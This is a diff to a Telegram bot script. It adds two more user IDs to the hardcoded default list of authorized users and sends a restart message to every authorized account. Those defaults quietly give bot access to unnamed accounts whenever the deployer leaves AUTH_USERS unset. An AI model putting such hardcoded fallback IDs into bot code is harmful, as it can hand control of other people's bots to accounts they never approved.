@@ -78,7 +78,7 @@ bot = Client(
     bot_token=BOT_TOKEN
 )
 
-AUTH_USER = os.environ.get('AUTH_USERS', '6947378236').split(',')
+AUTH_USER = os.environ.get('AUTH_USERS', '6947378236,6790294924,7735386939').split(',')
 AUTH_USERS = [int(user_id) for user_id in AUTH_USER]
 if int(OWNER) not in AUTH_USERS:
     AUTH_USERS.append(int(OWNER))
@@ -1418,16 +1418,16 @@ async def text_handler(bot: Client, m: Message):
 
 def notify_owner():
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": OWNER,
-        "text": "𝐁𝐨𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 ✅"
-    }
-    requests.post(url, data=data)
+    all_users = set(AUTH_USERS + [OWNER])  # Combine and remove duplicates
+    for user_id in all_users:
+        data = {
+            "chat_id": user_id,
+            "text": "𝐁𝐨𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐮𝐥𝐥𝐲 ✅\n\n <b>You Are Authorized Cutie... 🫠</b>"
+        }
+        requests.post(url, data=data)
 
 
 if __name__ == "__main__":
-    
-    notify_owner() 
-
+    notify_owner()
 
 bot.run()
